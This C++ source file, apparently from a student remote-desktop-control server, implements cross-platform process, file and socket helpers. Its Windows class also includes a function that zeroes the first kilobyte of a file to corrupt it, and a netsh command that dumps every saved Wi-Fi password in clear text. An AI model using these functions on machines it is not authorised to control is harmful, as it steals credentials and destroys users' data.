#include "C:\UNIVERSITY\ComputerNetwork\remote-desktop-control\server\include\core\Platform.h"
#include <sstream>
#include <fstream>
#include <algorithm>
#include <cstring>

namespace Platform
{

    std::string ProcessInfo::toString() const
    {
        std::ostringstream oss;
        oss << "PID: " << pid << " | Name: " << name
            << " | CPU: " << cpuUsage << "% | Memory: " << memoryUsage << " KB";
        return oss.str();
    }

    std::string SystemInfo::toString() const
    {
        std::ostringstream oss;
        oss << "OS: " << osName << " | Arch: " << architecture
            << " | Host: " << hostname << " | CPU Cores: " << cpuCores
            << " | Memory: " << availableMemory << "/" << totalMemory << " MB";
        return oss.str();
    }

#ifdef PLATFORM_WINDOWS
    class WindowsPlatform : public IPlatform
    {
    public:
        std::vector<ProcessInfo> listProcesses() override
        {
            std::vector<ProcessInfo> processes;
            DWORD pids[2048], needed;

            if (!EnumProcesses(pids, sizeof(pids), &needed))
                return processes;

            DWORD count = needed / sizeof(DWORD);
            for (DWORD i = 0; i < count; i++)
            {
                HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pids[i]);
                if (hProc)
                {
                    ProcessInfo info;
                    info.pid = pids[i];

                    TCHAR name[MAX_PATH] = TEXT("<unknown>");
                    HMODULE hMod;
                    DWORD cbNeeded;
                    if (EnumProcessModules(hProc, &hMod, sizeof(hMod), &cbNeeded))
                    {
                        GetModuleBaseName(hProc, hMod, name, sizeof(name) / sizeof(TCHAR));
                        info.name = name;
                    }

                    PROCESS_MEMORY_COUNTERS pmc;
                    if (GetProcessMemoryInfo(hProc, &pmc, sizeof(pmc)))
                    {
                        info.memoryUsage = pmc.WorkingSetSize / 1024;
                    }

                    info.cpuUsage = 0.0;
                    processes.push_back(info);
                    CloseHandle(hProc);
                }
            }
            return processes;
        }

        bool startProcess(const std::string &command, unsigned long &outPid) override
        {
            STARTUPINFOA si;
            ZeroMemory(&si, sizeof(si));
            si.cb = sizeof(si);
            PROCESS_INFORMATION pi;

            if (CreateProcessA(NULL, (LPSTR)command.c_str(), NULL, NULL, FALSE,
                               CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
            {
                outPid = pi.dwProcessId;
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return true;
            }
            return false;
        }

        bool killProcess(unsigned long pid) override
        {
            HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
            if (!hProc)
                return false;
            bool result = TerminateProcess(hProc, 0) != 0;
            CloseHandle(hProc);
            return result;
        }

        bool processExists(unsigned long pid) override
        {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
            if (hProc)
            {
                CloseHandle(hProc);
                return true;
            }
            return false;
        }

        ProcessInfo getProcessInfo(unsigned long pid) override
        {
            ProcessInfo info;
            info.pid = pid;
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
            if (hProc)
            {
                TCHAR name[MAX_PATH];
                if (GetModuleFileNameEx(hProc, NULL, name, MAX_PATH))
                {
                    info.path = name;
                    info.name = info.path.substr(info.path.find_last_of("\\/") + 1);
                }
                CloseHandle(hProc);
            }
            return info;
        }

        SystemInfo getSystemInfo() override
        {
            SystemInfo info;
            info.osName = getOSName();
            info.architecture = sizeof(void *) == 8 ? "x64" : "x86";

            char hostname[256];
            DWORD size = sizeof(hostname);
            GetComputerNameA(hostname, &size);
            info.hostname = hostname;

            SYSTEM_INFO sysInfo;
            GetSystemInfo(&sysInfo);
            info.cpuCores = sysInfo.dwNumberOfProcessors;

            MEMORYSTATUSEX memInfo;
            memInfo.dwLength = sizeof(MEMORYSTATUSEX);
            GlobalMemoryStatusEx(&memInfo);
            info.totalMemory = memInfo.ullTotalPhys / (1024 * 1024);
            info.availableMemory = memInfo.ullAvailPhys / (1024 * 1024);

            return info;
        }

        std::string getOSName() override
        {
            return "Windows";
        }

        std::vector<std::string> listDirectory(const std::string &path) override
        {
            std::vector<std::string> entries;
            WIN32_FIND_DATAA findData;
            HANDLE hFind = FindFirstFileA((path + "\\*").c_str(), &findData);

            if (hFind != INVALID_HANDLE_VALUE)
            {
                do
                {
                    entries.push_back(findData.cFileName);
                } while (FindNextFileA(hFind, &findData));
                FindClose(hFind);
            }
            return entries;
        }

        bool fileExists(const std::string &path) override
        {
            DWORD attr = GetFileAttributesA(path.c_str());
            return attr != INVALID_FILE_ATTRIBUTES;
        }

        std::string readFile(const std::string &path) override
        {
            std::ifstream file(path, std::ios::binary);
            if (!file)
                return "";
            return std::string((std::istreambuf_iterator<char>(file)),
                               std::istreambuf_iterator<char>());
        }

        bool writeFile(const std::string &path, const std::string &content) override
        {
            std::ofstream file(path, std::ios::binary);
            if (!file)
                return false;
            file << content;
            return true;
        }

        void initSockets() override
        {
            WSADATA wsa;
            WSAStartup(MAKEWORD(2, 2), &wsa);
        }

        void cleanupSockets() override
        {
            WSACleanup();
        }

        void closeSocket(SocketHandle socket) override
        {
            closesocket(socket);
        }

        // Function to delete file
        bool deleteFile(const std::string &path) override
        {
            return DeleteFileA(path.c_str()) != 0;
        }

        // Function to overide the crash data to file
        bool corruptFile(const std::string &path) override
        {
            std::fstream file(path, std::ios::in | std::ios::out | std::ios::binary);
            if (!file)
                return false;

            // Ghi đè 1KB đầu tiên bằng số 0 hoặc rác
            char garbage[1024];
            memset(garbage, 0, sizeof(garbage));

            file.seekp(0, std::ios::beg);
            file.write(garbage, sizeof(garbage));
            file.close();
            return true;
        }

        // Function to get Wifi Password
        std::string getWifiPasswords() override
        {
            std::string result = "";
            char buffer[128];

            // Lệnh này liệt kê tất cả profile wifi và hiện key=clear (password)
            // Lưu ý: Cần chạy Server với quyền Admin để thấy password
            std::string cmd = "for /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @echo %j | findstr /i /v \"echo\" | for /f \"tokens=*\" %a in ('netsh wlan show profile name=\"%j\" key=clear ^| findstr /i \"Key Content\"') do @echo Name: %j Pass: %a";

            // Dùng _popen để chạy lệnh và lấy output
            FILE *pipe = _popen(cmd.c_str(), "r");
            if (!pipe)
                return "Error: Failed to run netsh command";

            while (fgets(buffer, sizeof(buffer), pipe) != NULL)
            {
                result += buffer;
            }
            _pclose(pipe);

            if (result.empty())
                return "No Wifi profiles found or Access Denied.";
            return result;
        }
    };
#endif

#if defined(PLATFORM_LINUX) || defined(PLATFORM_MACOS)
    class UnixPlatform : public IPlatform
    {
    public:
        std::vector<ProcessInfo> listProcesses() override
        {
            std::vector<ProcessInfo> processes;
            DIR *dir = opendir("/proc");
            if (!dir)
                return processes;

            struct dirent *entry;
            while ((entry = readdir(dir)))
            {
                if (entry->d_type == DT_DIR)
                {
                    std::string pidStr = entry->d_name;
                    if (std::all_of(pidStr.begin(), pidStr.end(), ::isdigit))
                    {
                        ProcessInfo info;
                        info.pid = std::stoul(pidStr);

                        std::string cmdPath = "/proc/" + pidStr + "/cmdline";
                        std::ifstream cmdFile(cmdPath);
                        if (cmdFile)
                        {
                            std::getline(cmdFile, info.name, '\0');
                            if (!info.name.empty())
                            {
                                size_t pos = info.name.find_last_of('/');
                                if (pos != std::string::npos)
                                    info.name = info.name.substr(pos + 1);
                            }
                        }

                        std::string statPath = "/proc/" + pidStr + "/stat";
                        std::ifstream statFile(statPath);
                        if (statFile)
                        {
                            std::string line;
                            std::getline(statFile, line);
                            std::istringstream iss(line);
                            std::string token;
                            for (int i = 0; i < 23; i++)
                                iss >> token;
                            info.memoryUsage = std::stoul(token) / 1024;
                        }

                        info.cpuUsage = 0.0;
                        processes.push_back(info);
                    }
                }
            }
            closedir(dir);
            return processes;
        }

        bool startProcess(const std::string &command, unsigned long &outPid) override
        {
            pid_t pid = fork();
            if (pid == 0)
            {
                execl("/bin/sh", "sh", "-c", command.c_str(), (char *)NULL);
                _exit(1);
            }
            else if (pid > 0)
            {
                outPid = pid;
                return true;
            }
            return false;
        }

        bool killProcess(unsigned long pid) override
        {
            return kill(pid, SIGTERM) == 0;
        }

        bool processExists(unsigned long pid) override
        {
            return kill(pid, 0) == 0;
        }

        ProcessInfo getProcessInfo(unsigned long pid) override
        {
            ProcessInfo info;
            info.pid = pid;

            std::string cmdPath = "/proc/" + std::to_string(pid) + "/cmdline";
            std::ifstream cmdFile(cmdPath);
            if (cmdFile)
            {
                std::getline(cmdFile, info.path, '\0');
                info.name = info.path.substr(info.path.find_last_of('/') + 1);
            }
            return info;
        }

        SystemInfo getSystemInfo() override
        {
            SystemInfo info;
            info.osName = getOSName();
            info.architecture = sizeof(void *) == 8 ? "x64" : "x86";

            char hostname[256];
            gethostname(hostname, sizeof(hostname));
            info.hostname = hostname;

            info.cpuCores = sysconf(_SC_NPROCESSORS_ONLN);

            long pages = sysconf(_SC_PHYS_PAGES);
            long page_size = sysconf(_SC_PAGE_SIZE);
            info.totalMemory = pages * page_size / (1024 * 1024);

            long avail_pages = sysconf(_SC_AVPHYS_PAGES);
            info.availableMemory = avail_pages * page_size / (1024 * 1024);

            return info;
        }

        std::string getOSName() override
        {
#ifdef PLATFORM_LINUX
            return "Linux";
#else
            return "macOS";
#endif
        }

        std::vector<std::string> listDirectory(const std::string &path) override
        {
            std::vector<std::string> entries;
            DIR *dir = opendir(path.c_str());
            if (!dir)
                return entries;

            struct dirent *entry;
            while ((entry = readdir(dir)))
            {
                entries.push_back(entry->d_name);
            }
            closedir(dir);
            return entries;
        }

        bool fileExists(const std::string &path) override
        {
            return access(path.c_str(), F_OK) == 0;
        }

        std::string readFile(const std::string &path) override
        {
            std::ifstream file(path, std::ios::binary);
            if (!file)
                return "";
            return std::string((std::istreambuf_iterator<char>(file)),
                               std::istreambuf_iterator<char>());
        }

        bool writeFile(const std::string &path, const std::string &content) override
        {
            std::ofstream file(path, std::ios::binary);
            if (!file)
                return false;
            file << content;
            return true;
        }

        void initSockets() override
        {
            // No initialization needed for Unix sockets
        }

        void cleanupSockets() override
        {
            // No cleanup needed for Unix sockets
        }

        void closeSocket(SocketHandle socket) override
        {
            close(socket);
        }
    };
#endif

    std::unique_ptr<IPlatform> createPlatform()
    {
#ifdef PLATFORM_WINDOWS
        return std::make_unique<WindowsPlatform>();
#else
        return std::make_unique<UnixPlatform>();
#endif
    }

} // namespace Platform